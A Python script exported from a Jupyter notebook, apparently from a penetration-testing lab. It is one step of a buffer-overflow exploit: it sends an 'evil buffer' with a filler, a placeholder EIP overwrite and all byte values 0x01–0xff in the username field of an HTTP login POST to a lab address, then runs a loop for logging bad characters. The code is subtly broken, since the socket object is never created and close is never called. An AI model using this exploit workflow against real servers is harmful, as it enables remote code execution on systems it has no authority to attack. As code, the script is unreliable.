#!/usr/bin/env python
# coding: utf-8

# In[5]:


import socket
import string
import subprocess
import os
import re

characters   = string.printable[:62]
host         = '192.168.119.192'
target_host  = '192.168.192.10'
port         = 80
size         = 780
letter       = b'B'

hex_badchars=['{:02x}'.format(x) for x in range(1,256)] 

hex_location = '' #insert EIP location from last script


# In[ ]:


def header_maker(p):
    main_header="""POST /login HTTP/1.1\r
Host: 192.168.192.10\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://192.168.192.10/login\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {}\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r\n\r\n""".format(len(p))
    main_header=bytes(main_header,'utf-8')
    main_header+=p
    
    return main_header


# In[ ]:


print('!!!Sending evil buffer...!!!')

filler= letter*size
eip=b'A'*4
offset=b'C'*4
buffer=bytes.fromhex(''.join(hex_badchars))


buffer_str=filler+eip+offset+buffer

payload = b"username="+buffer_str+b"&password=A"

header=header_maker(payload)
s.connect((target_host,port))
s.send(header)
s.close


# In[20]:


known_bad=['00']
while True:
    for x in hex_badchars:
        if x not in known_bad:
            print(x)
    index=input('select the number to remove\nif done type "done"\n')
    if index.lower() == 'done':
        print(known_bad)
        break
    else:
        known_bad.append(hex_badchars[(hex_badchars.index(index))])
        


# In[ ]:




